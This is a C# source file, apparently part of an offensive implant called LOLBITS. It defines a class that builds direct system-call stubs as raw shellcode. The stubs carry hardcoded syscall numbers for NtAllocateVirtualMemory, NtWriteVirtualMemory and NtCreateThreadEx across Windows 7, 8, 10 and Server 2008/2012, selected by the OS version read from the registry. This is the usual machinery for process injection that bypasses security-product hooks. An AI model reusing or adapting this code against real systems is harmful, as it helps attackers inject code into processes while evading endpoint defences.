using System;
using System.Collections.Generic;

namespace LOLBITS
{
    public class SyscallManager
    {

        private Dictionary<string, Dictionary<string, int>> DicWinServ2008 = new Dictionary<string, Dictionary<string, int>>();
        private Dictionary<string, Dictionary<string, int>> DicWinServ2012 = new Dictionary<string, Dictionary<string, int>>();
        private Dictionary<string, Dictionary<string, int>> DicWin7 = new Dictionary<string, Dictionary<string, int>>();
        private Dictionary<string, Dictionary<string, int>> DicWin8 = new Dictionary<string, Dictionary<string, int>>();
        private Dictionary<string, Dictionary<string, int>> DicWin10 = new Dictionary<string, Dictionary<string, int>>();

        private byte[] shellcode = new byte[]
             {
                    0x4C, 0x8B, 0xD1,             // mov r10, rcx
                    0xB8, 0x00, 0x00, 0x00, 0x00, // mov eax, 0x00 (syscall identifier)
                    0x0F, 0x05,                   // syscall
                    0xC3                          // ret
            };




        public SyscallManager()
        {

            /////////////NtAllocateVirtualMemory
            Dictionary<string, int> Val2008 = new Dictionary<string, int>();
            Dictionary<string, int> Val2012 = new Dictionary<string, int>();
            Dictionary<string, int> Val7 = new Dictionary<string, int>();
            Dictionary<string, int> Val8 = new Dictionary<string, int>();
            Dictionary<string, int> Val10 = new Dictionary<string, int>();

            Val2008.Add("UNIQUE", 0x0015);

            Val2012.Add("SP0", 0x0016);
            Val2012.Add("R2", 0x0017);

            Val7.Add("UNIQUE", 0x0015);

            Val8.Add("8.0", 0x0016);
            Val8.Add("8.1", 0x0017);

            Val10.Add("UNIQUE", 0x0018);
            DicWinServ2008.Add("NtAllocateVirtualMemory", Val2008);
            DicWinServ2012.Add("NtAllocateVirtualMemory", Val2012);
            DicWin7.Add("NtAllocateVirtualMemory", Val7);
            DicWin8.Add("NtAllocateVirtualMemory", Val8);
            DicWin10.Add("NtAllocateVirtualMemory", Val10);

            /////////////NtWriteVirtualMemory
            Val2008 = new Dictionary<string, int>();
            Val2012 = new Dictionary<string, int>();
            Val7 = new Dictionary<string, int>();
            Val8 = new Dictionary<string, int>();
            Val10 = new Dictionary<string, int>();

            Val2008.Add("UNIQUE", 0x0037);

            Val2012.Add("SP0", 0x0038);
            Val2012.Add("R2", 0x0039);

            Val7.Add("UNIQUE", 0x0037);

            Val8.Add("8.0", 0x0038);
            Val8.Add("8.1", 0x0039);

            Val10.Add("UNIQUE", 0x003A);

            DicWinServ2008.Add("NtWriteVirtualMemory", Val2008);
            DicWinServ2012.Add("NtWriteVirtualMemory", Val2012);
            DicWin7.Add("NtWriteVirtualMemory", Val7);
            DicWin8.Add("NtWriteVirtualMemory", Val8);
            DicWin10.Add("NtWriteVirtualMemory", Val10);

            /////////////NtCreateThreadEx
            Val2008 = new Dictionary<string, int>();
            Val2012 = new Dictionary<string, int>();
            Val7 = new Dictionary<string, int>();
            Val8 = new Dictionary<string, int>();
            Val10 = new Dictionary<string, int>();

            Val2008.Add("UNIQUE", 0x00A5);

            Val2012.Add("SP0", 0x00AF);
            Val2012.Add("R2", 0x00B0);

            Val7.Add("UNIQUE", 0x00A5);

            Val8.Add("8.0", 0x00AF);
            Val8.Add("8.1", 0x00B0);

            Val10.Add("1507", 0x00B3);
            Val10.Add("1511", 0x00B4);
            Val10.Add("1607", 0x00B6);
            Val10.Add("1703", 0x00B9);
            Val10.Add("1709", 0x00BA);
            Val10.Add("1803", 0x00BB);
            Val10.Add("1809", 0x00BC);
            Val10.Add("1903", 0x00BD);
            Val10.Add("1909", 0x00BD);

            DicWinServ2008.Add("NtCreateThreadEx", Val2008);
            DicWinServ2012.Add("NtCreateThreadEx", Val2012);
            DicWin7.Add("NtCreateThreadEx", Val7);
            DicWin8.Add("NtCreateThreadEx", Val8);
            DicWin10.Add("NtCreateThreadEx", Val10);


        }

        public byte[] getSyscallASM(string functionName)
        {

            string subKey = @"SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion";
            Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.LocalMachine;
            Microsoft.Win32.RegistryKey skey = key.OpenSubKey(subKey);

            string product = skey.GetValue("ProductName").ToString();
            string release = skey.GetValue("ReleaseId").ToString();

            string[] ver = product.Split(' ');
            Dictionary<string, Dictionary<string, int>> dict = null;

            if(ver[1] == "Server")
            {
                switch (ver[2]){
                    case "2008": { dict = DicWinServ2008; break; }
                    case "2012": { dict = DicWinServ2012; break; }
                    default: { return null; }
                }
            }
            else
            {
                switch (ver[1])
                {
                    case "7": { dict = DicWin7; break; }
                    case "8": { dict = DicWin8; break; }
                    case "10": { dict = DicWin10; break; }
                    default: { return null; }
                }
            }

            Dictionary<string, int> funct = dict[functionName];
            var syscallValue = funct.ContainsKey("UNIQUE") ? funct["UNIQUE"] : funct[release];
            byte[] copy = shellcode;
            var syscallIdentifierBytes = BitConverter.GetBytes(syscallValue);
            Buffer.BlockCopy(syscallIdentifierBytes, 0, copy, 4, sizeof(uint));

            return copy;
        }
    }
}
